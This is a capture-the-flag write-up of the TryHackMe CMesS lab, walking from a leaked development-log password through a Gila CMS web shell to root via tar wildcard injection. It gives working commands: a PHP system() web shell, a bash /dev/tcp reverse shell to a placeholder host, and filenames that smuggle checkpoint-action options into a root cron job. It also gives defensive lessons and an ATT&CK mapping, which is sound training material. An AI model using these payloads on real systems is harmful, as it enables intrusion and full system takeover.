# CMesS-TryHackMe---Cybersecurity-Learning-Journey

````markdown
# CMesS — TryHackMe Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-CMesS-success)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![CMS](https://img.shields.io/badge/CMS-Gila%20CMS-informational)
![Focus](https://img.shields.io/badge/Focus-Web%20Exploitation%20%7C%20Privilege%20Escalation-red)

> A complete walkthrough of the **CMesS** machine from TryHackMe, covering virtual-host enumeration, credential disclosure, Gila CMS exploitation, web-shell deployment, credential discovery, SSH access, and cron wildcard privilege escalation.

---

## 📌 Machine Information

| Property | Details |
|---|---|
| Platform | [TryHackMe](https://tryhackme.com/) |
| Room | [CMesS](https://tryhackme.com/room/cmess) |
| Difficulty | Medium |
| Operating System | Linux |
| Web Server | Apache 2.4.18 |
| CMS | Gila CMS |
| Initial Access | Credential disclosure via development subdomain |
| User | `andre` |
| Privilege Escalation | `tar` wildcard / checkpoint abuse |
| Objective | User Flag + Root Flag |

---

## 🗺️ Attack Path

```text
Nmap
  │
  ▼
Apache + Gila CMS
  │
  ▼
Virtual Host Enumeration
  │
  ▼
dev.cmess.thm
  │
  ▼
Development Log
  │
  ▼
Credential Disclosure
andre@cmess.thm
  │
  ▼
Gila CMS Admin Panel
  │
  ▼
File Manager
  │
  ▼
PHP Web Shell
  │
  ▼
www-data
  │
  ▼
Database / Backup Credentials
  │
  ▼
SSH as andre
  │
  ▼
Writable Backup Directory
  │
  ▼
Root Cron Job
tar * 
  │
  ▼
Tar Checkpoint Abuse
  │
  ▼
SUID /bin/bash
  │
  ▼
root
````

---

# 1. Reconnaissance

Start with a standard Nmap scan:

```bash
nmap -sC -sV -oN nmap.txt 10.129.133.127
```

### Open Ports

|   Port | Service | Version / Information |
| -----: | ------- | --------------------- |
| 22/tcp | SSH     | OpenSSH 7.2p2 Ubuntu  |
| 80/tcp | HTTP    | Apache 2.4.18         |

The web server is running Apache on Ubuntu.

### robots.txt

```bash
curl -s http://10.129.133.127/robots.txt
```

Output:

```text
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

The HTML source also reveals the CMS:

```bash
curl -s http://10.129.133.127/ | grep -iE 'gila|generator|version'
```

The response identifies:

```text
Gila CMS
```

The application is therefore running **Gila CMS**.

---

# 2. Virtual Host Discovery

The main website did not immediately expose useful credentials, so the next step was virtual-host enumeration.

Using `ffuf`:

```bash
ffuf \
-u http://10.129.133.127 \
-H "Host: FUZZ.cmess.thm" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-fs <BASELINE_SIZE>
```

A valid virtual host was discovered:

```text
dev.cmess.thm
```

Add the hosts to `/etc/hosts`:

```bash
echo "10.129.133.127 cmess.thm dev.cmess.thm" | sudo tee -a /etc/hosts
```

Verify the development site:

```bash
curl -s http://dev.cmess.thm/
```

---

# 3. Credential Disclosure

The development site exposes a **Development Log**.

Relevant entries:

```text
andre@cmess.thm
Have you guys fixed the bug that was found on live?

support@cmess.thm
Hey Andre, We have managed to fix the misconfigured .htaccess file,
we're hoping to patch it in the upcoming patch!

andre@cmess.thm
That's ok, can you guys reset my password if you get a moment,
I seem to be unable to get onto the admin panel.

support@cmess.thm
Your password has been reset. Here: KPFTN_f2yxe%
```

This results in a valid credential pair:

```text
Username: andre@cmess.thm
Password: KPFTN_f2yxe%
```

This is a good example of why **development environments and internal logs should never expose sensitive credentials**.

---

# 4. Initial Access — Gila CMS

The main application exposes the Gila CMS login panel:

```text
http://cmess.thm/admin
```

The login form uses:

```text
username
password
```

The discovered credentials can be submitted to the login endpoint:

```bash
curl -c cookies.txt -b cookies.txt \
  -X POST "http://cmess.thm/admin" \
  -d "username=andre@cmess.thm&password=KPFTN_f2yxe%"
```

The credentials provide authenticated access to Gila CMS.

Useful functionality includes the File Manager:

```text
/admin/fm
```

and media management functionality.

---

# 5. Remote Code Execution

## 5.1 Understanding the Web Root

Inspection of the application's `.htaccess` configuration showed that most requests are rewritten to:

```text
index.php
```

However, several directories are excluded from the rewrite rules:

```text
/assets/
/tmp/
/themes/
/src/
/lib/
```

The `/src`, `/lib`, and `/themes` directories return `403 Forbidden`.

The `/tmp` directory restricts PHP execution.

The interesting directory is:

```text
/assets/
```

It is writable through the Gila CMS File Manager and PHP files placed there can be executed by Apache.

This creates a path from **authenticated CMS access → arbitrary PHP file creation → command execution**.

---

## 5.2 Obtain the CSRF Token

The File Manager requires a CSRF token for file modification operations.

Retrieve it with:

```bash
TOKEN=$(curl -b cookies.txt -s \
  "http://cmess.thm/admin/fm?f=assets/.htaccess" \
  | grep -oP "csrfToken = '\K[^']+")
```

---

## 5.3 Create a PHP Web Shell

Create a PHP file inside the `assets` directory:

```bash
curl -b cookies.txt -s \
  -X POST "http://cmess.thm/fm/newfile" \
  -d "path=assets/shell.php"
```

Write the PHP payload:

```bash
curl -b cookies.txt -s \
  -X POST "http://cmess.thm/fm/save" \
  -d "path=assets/shell.php" \
  -d "formToken=$TOKEN" \
  --data-urlencode \
  'contents=<?php system($_GET["cmd"]); ?>'
```

Test command execution:

```bash
curl -s \
  "http://cmess.thm/assets/shell.php?cmd=id"
```

Expected result:

```text
uid=33(www-data)
```

We now have command execution as:

```text
www-data
```

---

# 6. Establish a Reverse Shell

Start a listener on the attacking machine:

```bash
nc -lvnp 4444
```

Then trigger the web shell with a Bash reverse shell.

Replace `LHOST` with your VPN/attacking IP:

```bash
curl -s \
  "http://cmess.thm/assets/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/LHOST/4444%200>%261'"
```

A shell should connect back to the listener.

Confirm the current user:

```bash
whoami
```

Expected:

```text
www-data
```

---

# 7. Privilege Escalation to `andre`

Once inside the machine, enumerate application configuration files and credentials.

One important file is the Gila CMS configuration:

```text
config.php
```

It contains database credentials similar to:

```php
'host' => 'localhost',
'user' => 'root',
'pass' => 'r0otus3rpassw0rd',
'name' => 'gila',
```

The database can then be queried:

```bash
mysql -u root -pr0otus3rpassw0rd gila \
  -e 'SELECT id,username,email,pass FROM user;'
```

This may expose password hashes for application users.

However, an even more direct credential source is:

```bash
cat /opt/.password.bak
```

The backup contains credentials that can be used to access the `andre` account.

---

## SSH Access

Use the discovered credentials to connect via SSH:

```bash
ssh andre@10.129.133.127
```

Confirm the user:

```bash
whoami
```

Expected:

```text
andre
```

Retrieve the user flag:

```bash
cat ~/user.txt
```

> **User flag:** Redacted from this public writeup.

---

# 8. Root Privilege Escalation

After obtaining SSH access as `andre`, enumerate scheduled tasks.

```bash
cat /etc/crontab
```

The following cron job is particularly interesting:

```text
*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

The important properties are:

* The command runs as `root`.
* It runs every two minutes.
* `andre` controls the working directory.
* `tar` processes files using an unquoted wildcard:

```text
*
```

This is dangerous because filenames beginning with `--` can be interpreted as command-line options by `tar`.

---

# 9. Tar Checkpoint Abuse

GNU `tar` supports checkpoint options that can execute an action when a checkpoint is reached.

Because the cron job runs:

```bash
tar -zcf /tmp/andre_backup.tar.gz *
```

we can create filenames that become arguments to `tar`.

Move into the backup directory:

```bash
cd /home/andre/backup
```

Create a script that will make `/bin/bash` SUID:

```bash
echo 'chmod u+s /bin/bash' > shell.sh
```

Create the malicious checkpoint option files:

```bash
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
```

Verify the directory:

```bash
ls -la
```

The resulting files should include:

```text
--checkpoint=1
--checkpoint-action=exec=sh shell.sh
shell.sh
```

When the root cron job executes:

```bash
tar -zcf /tmp/andre_backup.tar.gz *
```

the malicious filenames are interpreted as `tar` options.

The checkpoint action executes:

```bash
sh shell.sh
```

which runs:

```bash
chmod u+s /bin/bash
```

---

# 10. Obtain a Root Shell

Wait for the cron job to execute, then check `/bin/bash`:

```bash
ls -la /bin/bash
```

The permissions should show the SUID bit:

```text
-rwsr-xr-x root root ...
```

Execute Bash while preserving effective privileges:

```bash
/bin/bash -p
```

Confirm privileges:

```bash
id
```

Expected:

```text
uid=1001(andre) gid=1001(andre) euid=0(root)
```

The effective UID is now `root`.

Retrieve the root flag:

```bash
cat /root/root.txt
```

> **Root flag:** Redacted from this public writeup.

---

# 11. Flags

| Flag | Location               | Status     |
| ---- | ---------------------- | ---------- |
| User | `/home/andre/user.txt` | ✅ Obtained |
| Root | `/root/root.txt`       | ✅ Obtained |

> Flag values are intentionally omitted from this public repository.

---

# 12. Lessons Learned

### 1. Enumerate Virtual Hosts

The main website was not the only web application.

```text
cmess.thm
    │
    └── dev.cmess.thm
```

The development environment contained sensitive information that was not exposed on the main website.

---

### 2. Development Environments Can Be Dangerous

The development log exposed a password reset message containing the user's new password.

Sensitive information should never be stored in publicly accessible development pages.

---

### 3. Authenticated File Managers Are High-Value Targets

Once authenticated to Gila CMS, the File Manager provided the ability to create and modify files.

Combined with a directory where PHP execution was permitted, this resulted in remote command execution.

---

### 4. Always Inspect `.htaccess`

Apache rewrite rules can significantly change the attack surface.

Understanding which directories are excluded from rewriting helped identify:

```text
/assets/
```

as a useful location for code execution.

---

### 5. Search for Credentials After Obtaining a Shell

Application configuration files and backups can contain:

* Database passwords
* Application credentials
* Password hashes
* Backup credentials
* API keys

In this machine, both the database configuration and `/opt/.password.bak` were valuable sources of information.

---

### 6. Cron Jobs Must Be Audited Carefully

This command:

```bash
tar -zcf /tmp/andre_backup.tar.gz *
```

looks harmless at first glance.

However, running it as `root` from a directory controlled by a low-privileged user creates a dangerous privilege-escalation primitive.

---

### 7. Avoid Unquoted Wildcards in Privileged Commands

Administrators should be particularly careful with patterns such as:

```bash
*
```

when the command:

* Runs as root
* Executes in a user-writable directory
* Uses command-line options
* Processes filenames as arguments

---

# 13. Attack Chain Summary

```text
Virtual Host Enumeration
        │
        ▼
dev.cmess.thm
        │
        ▼
Development Log
        │
        ▼
Credential Disclosure
        │
        ▼
Gila CMS Authentication
        │
        ▼
Authenticated File Manager
        │
        ▼
PHP Web Shell
        │
        ▼
Remote Command Execution
        │
        ▼
www-data
        │
        ▼
Credential Discovery
        │
        ▼
SSH as andre
        │
        ▼
Root Cron Job
        │
        ▼
tar Wildcard Injection
        │
        ▼
Checkpoint Action
        │
        ▼
SUID /bin/bash
        │
        ▼
root
```

---

# 14. Tools Used

* Nmap
* FFUF
* Gobuster
* cURL
* Netcat
* SSH
* MySQL
* Gila CMS File Manager
* GNU tar
* Linux command-line utilities

---

# 15. MITRE ATT&CK Mapping

| Technique     | Description                              |
| ------------- | ---------------------------------------- |
| **T1595**     | Active Scanning / Network Reconnaissance |
| **T1190**     | Exploit Public-Facing Application        |
| **T1078**     | Valid Accounts                           |
| **T1059**     | Command and Scripting Interpreter        |
| **T1505.003** | Web Shell                                |
| **T1552.001** | Credentials in Files                     |
| **T1053.003** | Cron                                     |
| **T1068**     | Exploitation for Privilege Escalation    |

> ATT&CK mappings are approximate classifications of the techniques demonstrated in the lab and are not intended as a one-to-one representation of the complete attack chain.

---

# 16. Defensive Perspective

The attack chain also demonstrates several practical defensive controls.

### Web Application

* Restrict access to development environments.
* Never expose development logs publicly.
* Never disclose passwords through web applications.
* Enforce strong authentication and authorization.
* Restrict file-manager functionality.
* Prevent execution of uploaded files.

### Apache

* Review `.htaccess` rules.
* Separate static file storage from executable content.
* Apply least privilege to web-server processes.
* Prevent PHP execution in upload directories.

### Credentials

* Do not store plaintext credentials in backup files.
* Protect application configuration files.
* Rotate credentials when they are exposed.
* Use a secrets-management solution where appropriate.

### Cron Jobs

Avoid privileged commands that process user-controlled filenames.

Instead of:

```bash
tar -zcf /tmp/backup.tar.gz *
```

use safer approaches that explicitly define the files being backed up and prevent user-controlled filenames from becoming command-line options.

---

# 17. Conclusion

CMesS demonstrates how several seemingly small security weaknesses can be chained together into a complete compromise.

The initial issue was not a sophisticated exploit. It was simply an exposed development environment containing sensitive credentials.

From there, the attack progressed through:

```text
Information Disclosure
        ↓
Valid Credentials
        ↓
Authenticated CMS Access
        ↓
File Upload / Web Shell
        ↓
Remote Command Execution
        ↓
Credential Discovery
        ↓
SSH Access
        ↓
Privileged Cron Job
        ↓
tar Wildcard Abuse
        ↓
Root
```

The key lesson is that security weaknesses should not be viewed in isolation. A seemingly minor information disclosure can become the first step in a much larger attack chain when combined with weak access controls, unsafe file handling, credential exposure, and privileged automation.

---

## Disclaimer

This writeup was created for educational purposes and authorized security training.

All testing was performed against the **TryHackMe CMesS lab environment**.

Do not use these techniques against systems that you do not own or do not have explicit permission to test.

---

## Author

**Salah Al Sabhi**
---

LinkedIn: []

X: [] 

---

### Tags

#TryHackMe #CMesS #CTF #CyberSecurity #EthicalHacking #PenetrationTesting #WebSecurity #GilaCMS #Linux #PrivilegeEscalation #Cron #Tar #WildcardInjection #FileUpload #VirtualHost #InfoSec #RedTeam #Boot2Root #SOC #Cybersecurity

```
```
